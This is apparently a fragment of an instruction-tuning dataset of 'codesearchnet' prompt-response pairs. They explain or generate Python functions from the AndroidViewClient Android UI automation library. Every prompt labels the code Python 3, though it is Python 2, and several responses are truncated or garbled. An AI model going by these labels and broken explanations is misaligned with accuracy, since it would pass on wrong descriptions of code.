sys.stderr, \"Taking screenshot using UiAutomatorHelper\"\n            received = self.uiAutomatorHelper.takeScreenshot()\n            stream = StringIO.StringIO(received)\n            try:\n                from PIL import Image\n                image = Image.open(stream)\n            except ImportError as ex:\n                # FIXME: this method should be global\n                self.pilNotInstalledWarning()\n                sys.exit(1)\n            except IOError, ex:\n                print >> sys.stderr, ex\n                print repr(stream)\n                sys.exit(1)\n        else:\n            image = self.device.takeSnapshot(reconnect=self.device.reconnect)\n        image.crop(box).save(filename, _format)", "response": "Write the View image to the specified filename."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef setText(self, text):\n        if self.text() == text:\n            return\n        self.touch()\n        maxSize = len(self.text()) + 1\n        self.device.press('KEYCODE_DEL', adbclient.DOWN_AND_UP, repeat=maxSize)\n        self.device.press('KEYCODE_FORWARD_DEL', adbclient.DOWN_AND_UP, repeat=maxSize)\n        self.type(text, alreadyTouched=True)", "response": "This function makes sure that any previously entered text is deleted before setting the value of the field."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nopening the notification shade.", "response": "def openNotification(self):\n        '''\n        Opens the notification shade.\n        '''\n\n        # the tablet has a different Notification/Quick Settings bar depending on x\n        w13 = self.device.display['width'] / 3\n        s = (w13, 0)\n        e = (w13, self.device.display['height']/2)\n        self.device.drag(s, e, 500, 20, -1)\n        self.vc.sleep(1)\n        self.vc.dump(-1)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef openQuickSettings(self):\n        '''\n        Opens the Quick Settings shade.\n        '''\n\n        # the tablet has a different Notification/Quick Settings bar depending on x\n        w23 = 2 * self.device.display['width'] / 3\n        s = (w23, 0)\n        e = (w23, self.device.display['height']/2)\n        self.device.drag(s, e, 500, 20, -1)\n        self.vc.sleep(1)\n        if self.vc.getSdkVersion() >= 20:\n            self.device.drag(s, e, 500, 20, -1)\n            self.vc.sleep(1)\n        self.vc.dump(-1)", "response": "Opens the Quick Settings shade."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef openQuickSettingsSettings(self):\n        '''\n        Opens the Quick Settings shade and then tries to open Settings from there.\n        '''\n\n        STATUS_BAR_SETTINGS_SETTINGS_BUTTON = [\n            u\"Settings\", u\"C\u00e0i \u0111\u1eb7t\", u\"Instellingen\", u\"\u053f\u0561\u0580\u0563\u0561\u057e\u0578\u0580\u0578\u0582\u0574\u0576\u0565\u0580\", u\"\u8bbe\u7f6e\", u\"Nastavitve\", u\"\u0dc3\u0dd0\u0d9a\u0dc3\u0dd3\u0db8\u0dca\", u\"Ayarlar\",\n            u\"Setelan\", u\"\u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438\", u\"\u062a\u0646\u0638\u06cc\u0645\u0627\u062a\", u\"Mga Setting\", u\"\u0422\u043e\u0445\u0438\u0440\u0433\u043e\u043e\", u\"Configuraci\u00f3\", u\"Set\u0103ri\", u\"\u041d\u0430\u043b\u0430\u0434\u044b\",\n            u\"Einstellungen\", u\"\u10de\u10d0\u10e0\u10d0\u10db\u10d4\u10e2\u10e0\u10d4\u10d1\u10d8\", u\"\u0938\u0947\u091f\u093f\u0919\u0939\u0930\u0942\", u\"\u053f\u0561\u0580\u0563\u0561\u057e\u0578\u0580\u0578\u0582\u0574\u0576\u0565\u0580\", u\"Nustatymai\", u\"Be\u00e1ll\u00edt\u00e1sok\", u\"\u8a2d\u5b9a\",\n            u\"\u0938\u0947\u091f\u093f\u0902\u0917\", u\"\u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438\", u\"Inst\u00e4llningar\", u\"\u8a2d\u5b9a\", u\"\u0e81\u0eb2\u0e99\u0e95\u0eb1\u0ec9\u0e87\u0e84\u0ec8\u0eb2\", u\"Configura\u00e7\u00f5es\", u\"Tetapan\", u\"\uc124\uc815\",\n            u\"\u1780\u17b6\u179a\u200b\u1780\u17c6\u178e\u178f\u17cb\", u\"Ajustes\", u\"\u05d4\u05d2\u05d3\u05e8\u05d5\u05ea\", u\"Ustawienia\", u\"Nastaven\u00ed\", u\"\u03a1\u03c5\u03b8\u03bc\u03af\u03c3\u03b5\u03b9\u03c2\", u\"\u0422\u043e\u0445\u0438\u0440\u0433\u043e\u043e\", u\"Ayarlar\",\n            u\"Indstillinger\", u\"\u041d\u0430\u043b\u0430\u0448\u0442\u0443\u0432\u0430\u043d\u043d\u044f\", u\"Mipangilio\", u\"Izilungiselelo\", u\"\u8a2d\u5b9a\", u\"Nastavenia\", u\"Param\u00e8tres\",\n            u\"\u1245\u1295\u1265\u122e\u127d\", u\"\u0e01\u0e32\u0e23\u0e15\u0e31\u0e49\u0e07\u0e04\u0e48\u0e32\", u\"Seaded\", u\"Iestat\u012bjumi\", u\"Innstillinger\", u\"\u041f\u043e\u0434\u0435\u0448\u0430\u0432\u0430\u045a\u0430\", u\"\u0627\u0644\u0625\u0639\u062f\u0627\u062f\u0627\u062a\", u\"\u0dc3\u0dd0\u0d9a\u0dc3\u0dd3\u0db8\u0dca\",\n            u\"Defini\u00e7\u00f5es\", u\"Configuraci\u00f3n\", u\"\u10de\u10d0\u10e0\u10d0\u10db\u10d4\u10e2\u10e0\u10d4\u10d1\u10d8\", u\"Postavke\", u\"Ayarlar\", u\"Impostazioni\", u\"Asetukset\",\n            u\"Instellings\", u\"Seaded\", u\"\u1780\u17b6\u179a\u200b\u1780\u17c6\u178e\u178f\u17cb\", u\"\u0938\u0947\u091f\u093f\u0919\u0939\u0930\u0942\", u\"Tetapan\"\n            ]\n\n        self.openQuickSettings()\n\n        # this works on API >= 20\n        found = False\n        for s in STATUS_BAR_SETTINGS_SETTINGS_BUTTON:\n            if DEBUG:\n                print >> sys.stderr, u\"finding view with cd=\", type(s)\n            view = self.vc.findViewWithContentDescription(u'''{0}'''.format(s))\n            if view:\n                found = True\n                view.touch()\n                break\n\n        if not found:\n            # for previous APIs, let's find the text\n            for s in STATUS_BAR_SETTINGS_SETTINGS_BUTTON:\n                if DEBUG:\n                    print >> sys.stderr, \"s=\", type(s)\n                    try:\n                        print >> sys.stderr, \"finding view with text=\", u'''{0}'''.format(s)\n                    except:\n                        pass\n                view = self.vc.findViewWithText(s)\n                if view:\n                    found = True\n                    view.touch()\n                    break\n\n        if not found:\n            raise ViewNotFoundException(\"content-description\", \"'Settings' or text 'Settings'\", \"ROOT\")\n\n        self.vc.sleep(1)\n        self.vc.dump(window=-1)", "response": "Opens the Quick Settings shade and then tries to open the Settings from there."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nperform a forward scroll action on the layout element until the text you provided is visible.", "response": "def scrollTextIntoView(self, text):\n        '''\n        Performs a forward scroll action on the scrollable layout element until the text you provided is visible,\n        or until swipe attempts have been exhausted. See setMaxSearchSwipes(int)\n        '''\n\n        if self.vc is None:\n            raise ValueError('vc must be set in order to use this method')\n        for n in range(self.maxSearchSwipes):\n            # FIXME: now I need to figure out the best way of navigating to the ViewClient asossiated\n            # with this UiScrollable.\n            # It's using setViewClient() now.\n            if DEBUG or DEBUG_CHANGE_LANGUAGE:\n                print >> sys.stderr, u\"Searching for text='%s'\" % text\n                for v in self.vc.views:\n                    try:\n                        print >> sys.stderr, \"    scrollTextIntoView: v=\", v.getId(),\n                        print >> sys.stderr, v.getText()\n                    except Exception, e:\n                        print >> sys.stderr, e\n                        pass\n            #v = self.vc.findViewWithText(text, root=self.view)\n            v = self.vc.findViewWithText(text)\n            if v is not None:\n                return v\n            self.flingForward()\n            #self.vc.sleep(1)\n            self.vc.dump(-1)\n            # WARNING: after this dump, the value kept in self.view is outdated, it should be refreshed\n            # in some way\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef CharacterData(self, data):\n        '''\n        Expat character data event handler\n        '''\n\n        if data.strip():\n            data = data.encode()\n            if not self.data:\n                self.data = data\n            else:\n                self.data += data", "response": "Character data event handler\n       "}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconnect to a device or exit the script.", "response": "def connectToDeviceOrExit(timeout=60, verbose=False, ignoresecuredevice=False, ignoreversioncheck=False, serialno=None):\n        '''\n        Connects to a device which serial number is obtained from the script arguments if available\n        or using the default regex C{.*}.\n\n        If the connection is not successful the script exits.\n\n        History\n        -------\n        In MonkeyRunner times, this method was a way of overcoming one of its limitations.\n        L{MonkeyRunner.waitForConnection()} returns a L{MonkeyDevice} even if the connection failed.\n        Then, to detect this situation, C{device.wake()} is attempted and if it fails then it is\n        assumed the previous connection failed.\n\n        @type timeout: int\n        @param timeout: timeout for the connection\n        @type verbose: bool\n        @param verbose: Verbose output\n        @type ignoresecuredevice: bool\n        @param ignoresecuredevice: Ignores the check for a secure device\n        @type ignoreversioncheck: bool\n        @param ignoreversioncheck: Ignores the check for a supported ADB version\n        @type serialno: str\n        @param serialno: The device or emulator serial number\n\n        @return: the device and serialno used for the connection\n        '''\n\n        progname = os.path.basename(sys.argv[0])\n        if serialno is None:\n            # eat all the extra options the invoking script may have added\n            args = sys.argv\n            while len(args) > 1 and args[1][0] == '-':\n                args.pop(1)\n            serialno = args[1] if len(args) > 1 else \\\n                    os.environ['ANDROID_SERIAL'] if os.environ.has_key('ANDROID_SERIAL') \\\n                    else '.*'\n        if IP_RE.match(serialno):\n            # If matches an IP address format and port was not specified add the default\n            serialno += ':%d' % ADB_DEFAULT_PORT\n        if verbose:\n            print >> sys.stderr, 'Connecting to a device with serialno=%s with a timeout of %d secs...' % \\\n                (serialno, timeout)\n        ViewClient.setAlarm(timeout+5)\n        # NOTE: timeout is used for 2 different timeouts, the one to set the alarm to timeout the connection with\n        # adb and the timeout used by adb (once connected) for the sockets\n        device = adbclient.AdbClient(serialno, ignoreversioncheck=ignoreversioncheck, timeout=timeout)\n        ViewClient.setAlarm(0)\n        if verbose:\n            print >> sys.stderr, 'Connected to device with serialno=%s' % serialno\n        secure = device.getSystemProperty('ro.secure')\n        debuggable = device.getSystemProperty('ro.debuggable')\n        versionProperty = device.getProperty(VERSION_SDK_PROPERTY)\n        if versionProperty:\n            version = int(versionProperty)\n        else:\n            if verbose:\n                print \"Couldn't obtain device SDK version\"\n            version = -1\n\n        # we are going to use UiAutomator for versions >= 16 that's why we ignore if the device\n        # is secure if this is true\n        if secure == '1' and debuggable == '0' and not ignoresecuredevice and version < 16:\n            print >> sys.stderr, \"%s: ERROR: Device is secure, AndroidViewClient won't work.\" % progname\n            if verbose:\n                print >> sys.stderr, \"    secure=%s debuggable=%s version=%d ignoresecuredevice=%s\" % \\\n                    (secure, debuggable, version, ignoresecuredevice)\n            sys.exit(2)\n        if device.serialno:\n            # If we know the serialno because it was set by AdbClient, use it\n            serialno = device.serialno\n\n        ipPortRE = re.compile(IP_DOMAIN_NAME_PORT_REGEX, re.IGNORECASE)\n\n        if re.search(\"[.*()+]\", serialno) and not ipPortRE.match(serialno):\n            # if a regex was used we have to determine the serialno used\n            serialno = ViewClient.__obtainDeviceSerialNumber(device)\n        if verbose:\n            print >> sys.stderr, 'Actual device serialno=%s' % serialno\n        return device, serialno"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nshow the View class, id and text if available. This function can be used as a transform function to L{ViewClient.traverse()} @type view: I{View} @param view: the View @type extraInfo: method @param extraInfo: the View method to add extra info @type noExtraInfo: str @param noExtraInfo: Don't add extra info @type extraAction: method @param extraAction: An extra action to be invoked for every view @return: the string containing class, id, and text if available", "response": "def traverseShowClassIdAndText(view, extraInfo=None, noExtraInfo=None, extraAction=None):\n        '''\n        Shows the View class, id and text if available.\n        This function can be used as a transform function to L{ViewClient.traverse()}\n\n        @type view: I{View}\n        @param view: the View\n        @type extraInfo: method\n        @param extraInfo: the View method to add extra info\n        @type noExtraInfo: str\n        @param noExtraInfo: Don't add extra info\n        @type extraAction: method\n        @param extraAction: An extra action to be invoked for every view\n\n        @return: the string containing class, id, and text if available\n        '''\n\n        try:\n            eis = ''\n            if extraInfo:\n                eis = extraInfo(view)\n                if not eis and noExtraInfo:\n                    eis = noExtraInfo\n            if eis:\n                eis = u' {0}'.format(eis)\n            if extraAction:\n                extraAction(view)\n            _str = unicode(view.getClass())\n            _str += ' '\n            _str += '%s' % view.getId()\n            _str += ' '\n            _str += view.getText() if view.getText() else ''\n            if eis:\n                _str += eis\n            return _str\n        except Exception, e:\n            import traceback\n            return u'Exception in view=%s: %s:%s\\n%s' % (view.__smallStr__(), sys.exc_info()[0].__name__, e, traceback.format_exc())"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nshowing the View class, id, text if available and unique id and takes the screenshot. This function can be used as a transform function to L{ViewClient.traverse()} @type view: I{View} @param view: the View @return: the string containing class, id, and text if available and the content description", "response": "def traverseShowClassIdTextContentDescriptionAndScreenshot(view):\n        '''\n        Shows the View class, id, text if available and unique id and takes the screenshot.\n        This function can be used as a transform function to L{ViewClient.traverse()}\n\n        @type view: I{View}\n        @param view: the View\n        @return: the string containing class, id, and text if available and the content description\n        '''\n\n        return ViewClient.traverseShowClassIdAndText(view, View.getContentDescription, 'NAF', extraAction=ViewClient.writeViewImageToFileInDir)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef serviceResponse(self, response):\n        '''\n        Checks the response received from the I{ViewServer}.\n\n        @return: C{True} if the response received matches L{PARCEL_TRUE}, C{False} otherwise\n        '''\n\n        PARCEL_TRUE = \"Result: Parcel(00000000 00000001   '........')\\r\\n\"\n        ''' The TRUE response parcel '''\n        if DEBUG:\n            print >>sys.stderr, \"serviceResponse: comparing '%s' vs Parcel(%s)\" % (response, PARCEL_TRUE)\n        return response == PARCEL_TRUE", "response": "Checks the response received from the I { ViewServer.\n            method."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsets the list of views from the received string.", "response": "def setViews(self, received, windowId=None):\n        '''\n        Sets L{self.views} to the received value splitting it into lines.\n\n        @type received: str\n        @param received: the string received from the I{View Server}\n        '''\n\n        if not received or received == \"\":\n            raise ValueError(\"received is empty\")\n        self.views = []\n        ''' The list of Views represented as C{str} obtained after splitting it into lines after being received from the server. Done by L{self.setViews()}. '''\n        self.__parseTree(received.split(\"\\n\"), windowId)\n        if DEBUG:\n            print >>sys.stderr, \"there are %d views in this dump\" % len(self.views)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsetting the self. views to the received value parsing the received XML.", "response": "def setViewsFromUiAutomatorDump(self, received):\n        '''\n        Sets L{self.views} to the received value parsing the received XML.\n\n        @type received: str\n        @param received: the string received from the I{UI Automator}\n        '''\n\n        if not received or received == \"\":\n            raise ValueError(\"received is empty\")\n        self.views = []\n        ''' The list of Views represented as C{str} obtained after splitting it into lines after being received from the server. Done by L{self.setViews()}. '''\n        self.__parseTreeFromUiAutomatorDump(received)\n        if DEBUG:\n            print >>sys.stderr, \"there are %d views in this dump\" % len(self.views)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef __splitAttrs(self, strArgs):\n        '''\n        Splits the C{View} attributes in C{strArgs} and optionally adds the view id to the C{viewsById} list.\n\n        Unique Ids\n        ==========\n        It is very common to find C{View}s having B{NO_ID} as the Id. This turns very difficult to\n        use L{self.findViewById()}. To help in this situation this method assigns B{unique Ids}.\n\n        The B{unique Ids} are generated using the pattern C{id/no_id/<number>} with C{<number>} starting\n        at 1.\n\n        @type strArgs: str\n        @param strArgs: the string containing the raw list of attributes and values\n\n        @return: Returns the attributes map.\n        '''\n\n        if self.useUiAutomator:\n            raise RuntimeError(\"This method is not compatible with UIAutomator\")\n        # replace the spaces in text:mText to preserve them in later split\n        # they are translated back after the attribute matches\n        textRE = re.compile('%s=%s,' % (self.textProperty, _nd('len')))\n        m = textRE.search(strArgs)\n        if m:\n            __textStart = m.end()\n            __textLen = int(m.group('len'))\n            __textEnd = m.end() + __textLen\n            s1 = strArgs[__textStart:__textEnd]\n            s2 = s1.replace(' ', WS)\n            strArgs = strArgs.replace(s1, s2, 1)\n\n        idRE = re.compile(\"(?P<viewId>id/\\S+)\")\n        attrRE = re.compile('%s(?P<parens>\\(\\))?=%s,(?P<val>[^ ]*)' % (_ns('attr'), _nd('len')), flags=re.DOTALL)\n        hashRE = re.compile('%s@%s' % (_ns('class'), _nh('oid')))\n\n        attrs = {}\n        viewId = None\n        m = idRE.search(strArgs)\n        if m:\n            viewId = m.group('viewId')\n            if DEBUG:\n                print >>sys.stderr, \"found view with id=%s\" % viewId\n\n        for attr in strArgs.split():\n            m = attrRE.match(attr)\n            if m:\n                __attr = m.group('attr')\n                __parens = '()' if m.group('parens') else ''\n                __len = int(m.group('len'))\n                __val = m.group('val')\n                if WARNINGS and __len != len(__val):\n                    warnings.warn(\"Invalid len: expected: %d   found: %d   s=%s   e=%s\" % (__len, len(__val), __val[:50], __val[-50:]))\n                if __attr == self.textProperty:\n                    # restore spaces that have been replaced\n                    __val = __val.replace(WS, ' ')\n                attrs[__attr + __parens] = __val\n            else:\n                m = hashRE.match(attr)\n                if m:\n                    attrs['class'] = m.group('class')\n                    attrs['oid'] = m.group('oid')\n                else:\n                    if DEBUG:\n                        print >>sys.stderr, attr, \"doesn't match\"\n\n        if True: # was assignViewById\n            if not viewId:\n                # If the view has NO_ID we are assigning a default id here (id/no_id) which is\n                # immediately incremented if another view with no id was found before to generate\n                # a unique id\n                viewId = \"id/no_id/1\"\n            if viewId in self.viewsById:\n                # sometimes the view ids are not unique, so let's generate a unique id here\n                i = 1\n                while True:\n                    newId = re.sub('/\\d+$', '', viewId) + '/%d' % i\n                    if not newId in self.viewsById:\n                        break\n                    i += 1\n                viewId = newId\n                if DEBUG:\n                    print >>sys.stderr, \"adding viewById %s\" % viewId\n            # We are assigning a new attribute to keep the original id preserved, which could have\n            # been NO_ID repeated multiple times\n            attrs['uniqueId'] = viewId\n\n        return attrs", "response": "Splits the attributes in the string and adds the view id to the viewsById list."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef __parseTree(self, receivedLines, windowId=None):\n        '''\n        Parses the View tree contained in L{receivedLines}. The tree is created and the root node assigned to L{self.root}.\n        This method also assigns L{self.viewsById} values using L{View.getUniqueId} as the key.\n\n        @type receivedLines: str\n        @param receivedLines: the string received from B{View Server}\n        '''\n\n        self.root = None\n        self.viewsById = {}\n        self.views = []\n        parent = None\n        parents = []\n        treeLevel = -1\n        newLevel = -1\n        lastView = None\n        for v in receivedLines:\n            if v == '' or v == 'DONE' or v == 'DONE.':\n                break\n            attrs = self.__splitAttrs(v)\n            if not self.root:\n                if v[0] == ' ':\n                    raise Exception(\"Unexpected root element starting with ' '.\")\n                self.root = View.factory(attrs, self.device, self.build[VERSION_SDK_PROPERTY], self.forceViewServerUse, windowId, self.uiAutomatorHelper)\n                if DEBUG: self.root.raw = v\n                treeLevel = 0\n                newLevel = 0\n                lastView = self.root\n                parent = self.root\n                parents.append(parent)\n            else:\n                newLevel = (len(v) - len(v.lstrip()))\n                if newLevel == 0:\n                    raise Exception(\"newLevel==0 treeLevel=%d but tree can have only one root, v=%s\" % (treeLevel, v))\n                child = View.factory(attrs, self.device, self.build[VERSION_SDK_PROPERTY], self.forceViewServerUse, windowId, self.uiAutomatorHelper)\n                if DEBUG: child.raw = v\n                if newLevel == treeLevel:\n                    parent.add(child)\n                    lastView = child\n                elif newLevel > treeLevel:\n                    if (newLevel - treeLevel) != 1:\n                        raise Exception(\"newLevel jumps %d levels, v=%s\" % ((newLevel-treeLevel), v))\n                    parent = lastView\n                    parents.append(parent)\n                    parent.add(child)\n                    lastView = child\n                    treeLevel = newLevel\n                else: # newLevel < treeLevel\n                    for _ in range(treeLevel - newLevel):\n                        parents.pop()\n                    parent = parents.pop()\n                    parents.append(parent)\n                    parent.add(child)\n                    treeLevel = newLevel\n                    lastView = child\n            self.views.append(lastView)\n            self.viewsById[lastView.getUniqueId()] = lastView", "response": "Parses the received lines and creates a tree of View objects."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef __updateNavButtons(self):\n\n        navButtons = None\n        for v in self.views:\n            if v.getId() == 'com.android.systemui:id/nav_buttons':\n                navButtons = v\n                break\n        if navButtons:\n            self.navBack = self.findViewById('com.android.systemui:id/back', navButtons)\n            self.navHome = self.findViewById('com.android.systemui:id/home', navButtons)\n            self.navRecentApps = self.findViewById('com.android.systemui:id/recent_apps', navButtons)\n        else:\n            if self.uiAutomatorHelper:\n                print >> sys.stderr, \"WARNING: nav buttons not found. Perhaps the device has hardware buttons.\"\n            self.navBack = None\n            self.navHome = None\n            self.navRecentApps = None", "response": "Updates the navigation buttons that might be on the device screen."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef traverse(self, root=\"ROOT\", indent=\"\", transform=None, stream=sys.stdout):\n        '''\n        Traverses the C{View} tree and prints its nodes.\n\n        The nodes are printed converting them to string but other transformations can be specified\n        by providing a method name as the C{transform} parameter.\n\n        @type root: L{View}\n        @param root: the root node from where the traverse starts\n        @type indent: str\n        @param indent: the indentation string to use to print the nodes\n        @type transform: method\n        @param transform: a method to use to transform the node before is printed\n        '''\n\n        if transform is None:\n            # this cannot be a default value, otherwise\n            # TypeError: 'staticmethod' object is not callable\n            # is raised\n            transform = ViewClient.TRAVERSE_CIT\n\n        if type(root) == types.StringType and root == \"ROOT\":\n            root = self.root\n\n        return ViewClient.__traverse(root, indent, transform, stream)", "response": "Traverse the C { View } tree and prints its nodes."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef dump(self, window=-1, sleep=1):\n        '''\n        Dumps the window content.\n\n        Sleep is useful to wait some time before obtaining the new content when something in the\n        window has changed.\n\n        @type window: int or str\n        @param window: the window id or name of the window to dump.\n                    The B{name} is the package name or the window name (i.e. StatusBar) for\n                    system windows.\n                    The window id can be provided as C{int} or C{str}. The C{str} should represent\n                    and C{int} in either base 10 or 16.\n                    Use -1 to dump all windows.\n                    This parameter only is used when the backend is B{ViewServer} and it's\n                    ignored for B{UiAutomator}.\n        @type sleep: int\n        @param sleep: sleep in seconds before proceeding to dump the content\n\n        @return: the list of Views as C{str} received from the server after being split into lines\n        '''\n\n        if sleep > 0:\n            time.sleep(sleep)\n\n        if self.useUiAutomator:\n            if self.uiAutomatorHelper:\n                received = self.uiAutomatorHelper.dumpWindowHierarchy()\n            else:\n                api = self.getSdkVersion()\n                if api >= 24:\n                    # In API 23 the process' stdout,in and err are connected to the socket not to the pts as in\n                    # previous versions, so we can't redirect to /dev/tty\n                    # Also, if we want to write to /sdcard/something it fails event though /sdcard is a symlink\n                    # Also, 'primary' storage was added.\n                    if self.serialno.startswith('emulator'):\n                        pathname = '/storage/self/primary'\n                    else:\n                        pathname = '/sdcard'\n                    filename = 'window_dump.xml'\n                    cmd = 'uiautomator dump %s %s/%s >/dev/null && cat %s/%s' % ('--compressed' if self.compressedDump else '', pathname, filename, pathname, filename)\n                elif api == 23:\n                    # In API 23 the process' stdout,in and err are connected to the socket not to the pts as in\n                    # previous versions, so we can't redirect to /dev/tty\n                    # Also, if we want to write to /sdcard/something it fails event though /sdcard is a symlink\n                    if self.serialno.startswith('emulator'):\n                        pathname = '/storage/self'\n                        filename = 'window_dump.xml'\n                        cmd = 'uiautomator dump %s %s/%s >/dev/null && cat %s/%s' % ('--compressed' if self.compressedDump else '', pathname, filename, pathname, filename)\n                    elif self.ro['product.board'] in ['msd838', 'msd938_STB', 'msd938']:\n                            cmd = 'uiautomator dump %s /dev/tty >/dev/null' % ('--compressed' if self.compressedDump else '')\n                    else:\n                        pathname = '/sdcard'\n                        filename = 'window_dump.xml'\n                        cmd = 'uiautomator dump %s %s/%s >/dev/null && cat %s/%s' % ('--compressed' if self.compressedDump else '', pathname, filename, pathname, filename)\n                else:\n                    # NOTICE:\n                    # Using /dev/tty this works even on devices with no sdcard\n                    cmd = 'uiautomator dump %s /dev/tty >/dev/null' % ('--compressed' if api >= 18 and self.compressedDump else '')\n                if DEBUG_UI_AUTOMATOR:\n                    print >> sys.stderr, \"executing '%s'\" % cmd\n                received = self.device.shell(cmd)\n                received = unicode(received, encoding='utf-8', errors='replace')\n            if not received:\n                raise RuntimeError('ERROR: Empty UiAutomator dump was received')\n            if DEBUG:\n                self.received = received\n            if DEBUG_RECEIVED:\n                print >>sys.stderr, \"received %d chars\" % len(received)\n                print >>sys.stderr\n                print >>sys.stderr, repr(received)\n                print >>sys.stderr\n            onlyKilledRE = re.compile('Killed$')\n            if onlyKilledRE.search(received):\n                MONKEY = 'com.android.commands.monkey'\n                extraInfo = ''\n                if self.device.shell('ps | grep \"%s\"' % MONKEY):\n                    extraInfo = \"\\nIt is know that '%s' conflicts with 'uiautomator'. Please kill it and try again.\" % MONKEY\n                raise RuntimeError('''ERROR: UiAutomator output contains no valid information. UiAutomator was killed, no reason given.''' + extraInfo)\n            if self.ignoreUiAutomatorKilled:\n                if DEBUG_RECEIVED:\n                    print >>sys.stderr, \"ignoring UiAutomator Killed\"\n                killedRE = re.compile('</hierarchy>[\\n\\S]*Killed', re.MULTILINE)\n                if killedRE.search(received):\n                    received = re.sub(killedRE, '</hierarchy>', received)\n                elif DEBUG_RECEIVED:\n                    print \"UiAutomator Killed: NOT FOUND!\"\n                # It seems that API18 uiautomator spits this message to stdout\n                dumpedToDevTtyRE = re.compile('</hierarchy>[\\n\\S]*UI hierchary dumped to: /dev/tty.*', re.MULTILINE)\n                if dumpedToDevTtyRE.search(received):\n                    received = re.sub(dumpedToDevTtyRE, '</hierarchy>', received)\n                if DEBUG_RECEIVED:\n                    print >>sys.stderr, \"received=\", received\n            # API19 seems to send this warning as part of the XML.\n            # Let's remove it if present\n            received = received.replace('WARNING: linker: libdvm.so has text relocations. This is wasting memory and is a security risk. Please fix.\\r\\n', '')\n            if re.search('\\[: not found', received):\n                raise RuntimeError('''ERROR: Some emulator images (i.e. android 4.1.2 API 16 generic_x86) does not include the '[' command.\nWhile UiAutomator back-end might be supported 'uiautomator' command fails.\nYou should force ViewServer back-end.''')\n\n            if received.startswith('ERROR: could not get idle state.'):\n                # See https://android.googlesource.com/platform/frameworks/testing/+/jb-mr2-release/uiautomator/cmds/uiautomator/src/com/android/commands/uiautomator/DumpCommand.java\n                raise RuntimeError('''The views are being refreshed too frequently to dump.''')\n            if received.find(u'Only ROTATION_0 supported') != -1:\n                raise RuntimeError('''UiAutomatorHelper backend with support for only ROTATION_0 found.''')\n            self.setViewsFromUiAutomatorDump(received)\n        else:\n            if isinstance(window, str):\n                if window != '-1':\n                    self.list(sleep=0)\n                    found = False\n                    for wId in self.windows:\n                        try:\n                            if window == self.windows[wId]:\n                                window = wId\n                                found = True\n                                break\n                        except:\n                            pass\n                        try:\n                            if int(window) == wId:\n                                window = wId\n                                found = True\n                                break\n                        except:\n                            pass\n                        try:\n                            if int(window, 16) == wId:\n                                window = wId\n                                found = True\n                                break\n                        except:\n                            pass\n\n                    if not found:\n                        raise RuntimeError(\"ERROR: Cannot find window '%s' in %s\" % (window, self.windows))\n                else:\n                    window = -1\n\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            try:\n                s.connect((VIEW_SERVER_HOST, self.localPort))\n            except socket.error, ex:\n                raise RuntimeError(\"ERROR: Connecting to %s:%d: %s\" % (VIEW_SERVER_HOST, self.localPort, ex))\n            cmd = 'dump %x\\r\\n' % window\n            if DEBUG:\n                print >>sys.stderr, \"executing: '%s'\" % cmd\n            s.send(cmd)\n            received = \"\"\n            doneRE = re.compile(\"DONE\")\n            ViewClient.setAlarm(120)\n            while True:\n                if DEBUG_RECEIVED:\n                    print >>sys.stderr, \"    reading from socket...\"\n                received += s.recv(1024)\n                if doneRE.search(received[-7:]):\n                    break\n            s.close()\n            ViewClient.setAlarm(0)\n            if DEBUG:\n                self.received = received\n            if DEBUG_RECEIVED:\n                print >>sys.stderr, \"received %d chars\" % len(received)\n                print >>sys.stderr\n                print >>sys.stderr, received\n                print >>sys.stderr\n            if received:\n                for c in received:\n                    if ord(c) > 127:\n                        received = unicode(received, encoding='utf-8', errors='replace')\n                        break\n            self.setViews(received, hex(window)[2:])\n\n            if DEBUG_TREE:\n                self.traverse(self.root)\n\n        return self.views", "response": "Dumps the contents of the current window."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef list(self, sleep=1):\n        '''\n        List the windows.\n\n        Sleep is useful to wait some time before obtaining the new content when something in the\n        window has changed.\n        This also sets L{self.windows} as the list of windows.\n\n        @type sleep: int\n        @param sleep: sleep in seconds before proceeding to dump the content\n\n        @return: the list of windows\n        '''\n\n        if sleep > 0:\n            time.sleep(sleep)\n\n        if self.useUiAutomator:\n            raise Exception(\"Not implemented yet: listing windows with UiAutomator\")\n        else:\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            try:\n                s.connect((VIEW_SERVER_HOST, self.localPort))\n            except socket.error, ex:\n                raise RuntimeError(\"ERROR: Connecting to %s:%d: %s\" % (VIEW_SERVER_HOST, self.localPort, ex))\n            s.send('list\\r\\n')\n            received = \"\"\n            doneRE = re.compile(\"DONE\")\n            while True:\n                received += s.recv(1024)\n                if doneRE.search(received[-7:]):\n                    break\n            s.close()\n            if DEBUG:\n                self.received = received\n            if DEBUG_RECEIVED:\n                print >>sys.stderr, \"received %d chars\" % len(received)\n                print >>sys.stderr\n                print >>sys.stderr, received\n                print >>sys.stderr\n\n            self.windows = {}\n            for line in received.split('\\n'):\n                if not line:\n                    break\n                if doneRE.search(line):\n                    break\n                values = line.split()\n                if len(values) > 1:\n                    package = values[1]\n                else:\n                    package = \"UNKNOWN\"\n                if len(values) > 0:\n                    wid = values[0]\n                else:\n                    wid = 